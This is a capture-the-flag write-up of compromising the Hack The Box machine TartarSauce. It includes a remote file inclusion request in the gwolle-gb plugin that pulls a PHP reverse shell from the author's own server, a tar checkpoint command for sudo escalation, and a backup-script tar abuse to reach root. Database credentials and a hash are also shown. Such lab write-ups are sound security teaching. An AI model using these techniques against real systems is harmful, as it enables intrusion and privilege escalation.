Main steps
1. Fuzz site to find `WordPress` directory
2. Scan `WordPress` to find vulnerable plugin
3. Locate exploit for plugin to gain shell access
4. Enumerate `sudo -l` to gain user access
5. Enumerate `systemctl list-timers` to find service running
6. Enumerate service binary to find vulnerability with root executing `tar`
7. Privilege escalate by abusing root `tar` usage 

Learning points
1. Remember to fuzz directories even if there seems to be something obvious
2. `tar` maintains permissions when extracting files as root - if a file in the archive has its `SUID` bit set, extracting it as root will cause it to keep that `SUID` bit

`nmap`
![[Pasted image 20260319171314.png]]

Port 80 open.

`nmap` found a `robots.txt` files with a few entries.

The main webpage is just a static page with no links.
![[Pasted image 20260319171434.png]]

5 entries in the `robots.txt` file:
1. `/webservices/tar/tar/source/`
2. `/webservices/monstra-3.0.4/
3. `/webservices/easy-file-uploader/`
4. `/webservices/developmental/`
5. `/webservices/phpmyadmin/`

`monstra 3.0.4` immediately caught my attention. Googling this shows that it is a CMS, and this specific version has an authenticated arbitrary file upload to RCE exploit, CVE-2025-69906, and CVE-2018-9037.

Tried accessing the entries in the `robots.txt` but only the `monstra-3.0.4` link works, leading me to the `Monstra` CMS home page with a link to the admin login.
![[Pasted image 20260319172217.png]]

Tried logging in with `admin`:`admin` and was able to get access to the dashboard.
![[Pasted image 20260319172310.png]]

Tried running the exploits but was unsuccessful, so I tried manually uploading a file into the `filemanager`, but was always met with an error saying the file was not uploaded.

Back to enumerating the site: `Ferxobuster` found some other interesting directories under `/webservices` - notably, a `WordPress` site at `/webservices/wp` which shows a test blog page.
![[Pasted image 20260319174024.png]]

The `WordPress` admin login is at `http://tartarsauce.htb/webservices/wp/wp-login.php`. Tried some default credentials but was unable to login.

Ran `wpscan` on the site and found the version and some plugin information.

`WordPress version 4.9.4`
![[Pasted image 20260319183922.png]]

Plugins:
1. `akismet 4.0.3`
2. `brute-force-login-protection 1.5.3`
3. `gwolle-gb 2.3.10`

Googling these plugin versions showed an RFI vulnerability for `gwolle-gb`, CVE-2015-8351. By abusing the GET parameter `abspath`, an attacker can include a file named `wp-load.php` from an arbitrary remote server, and execute its content.

Looking at POC code I found here https://github.com/G4sp4rCS/exploit-CVE-2015-8351, all I need to do is create a PHP file in my HTTP server and add malicious code to it, then send a GET request to the URL `http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.67/` with my IP as the `abspath` parameter. The plugin will then GET the malicious `wp-load.php` file from my server and execute it.

I wrote a PHP reverse shell into the file and served it to the remote server, and was able to spawn a reverse shell as `www-data`.
![[Pasted image 20260319184954.png]]

Checked the `/etc/passwd` file and found a user named `onuma`.
![[Pasted image 20260319185108.png]]

Checked `sudo -l` and found something interesting: the `www-data` can run `tar` as the user `onuma` without a password.

From GTFObins, `tar` can be used to privilege escalate with `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`. Ran this command with `sudo -u onuma` and got a shell as `onuma`.
![[Pasted image 20260319185416.png]]

Checked the `wp-config.php` file and found database credentials.
![[Pasted image 20260319190016.png]]

`wpuser`: ` w0rdpr3$$d@t@b@$3@cc3$$ `

Found credentials for the `wpadmin` account in the database.
![[Pasted image 20260319190126.png]]

` $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 `

Ran `hashcat` on this hash but was unable to crack it.

Checked `SUID`, `sudo -l`, `cron`, listening ports and found nothing interesting.

Checked `systemctl list-timers` and found a timer running every 5 minutes, `bakuperer.timer`, that runs the `backuperer.service` service. Checked the contents with `systemctl cat`.
![[Pasted image 20260319191451.png]]

The service executes the binary `/usr/sbin/backuperer`. This is a `bash` script owned by root that backs up the website to `/var/backups`.

The script `tar`s a directory as `onuma`, then does a integrity check with the last backup, then extracts the `tar` file as root. When `tar` extracts files, permissions settings are maintained, meaning if it is run as root, it will be able to read any file on the machine.

By waiting for the initial `tar` archive to be created, then replacing a file inside with a `symlink` to the `/root.txt` file while the script sleeps for 30 seconds, the integrity check will fail (since the `/root.txt` file did not exist in the previous backup) and write the contents of `/root.txt` to the `onuma_backup_error.txt` file.

Another way to exploit this would be to create a C program with its `SUID` bit set, and `tar` it as root on my machine, making sure that it is owned by root with `--owner=root --group=root`. Moving this archive to the remote server and replacing the backup archive before the sleep finishes will cause the malicious program to be extracted by the root `tar` in the `backuperer` script and allow me to run it as root, since the permissions are maintained.

It is also possible to get the binary for `bash` and set its `SUID` bit, then do the same thing as above with `tar`, and run the binary with the `-p` parameter to get a shell with `EUID=0(root)`, then achieve persistence by adding `SUID` to the actual `/bin/bash`.

I tried using both these methods but kept running into issues with missing or incompatible libraries. This can be circumvented by created a container with an older Linux version, then compiling the program there, since the HTB machine is quite old as of this writeup.

Some references for the extra root shell methods:
https://0xdf.gitlab.io/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html
https://sparshjazz.medium.com/hackthebox-tartarsauce-writeup-8bb3891407cd
https://pswalia2u.medium.com/tartarsauce-htb-privesc-7f0a20141781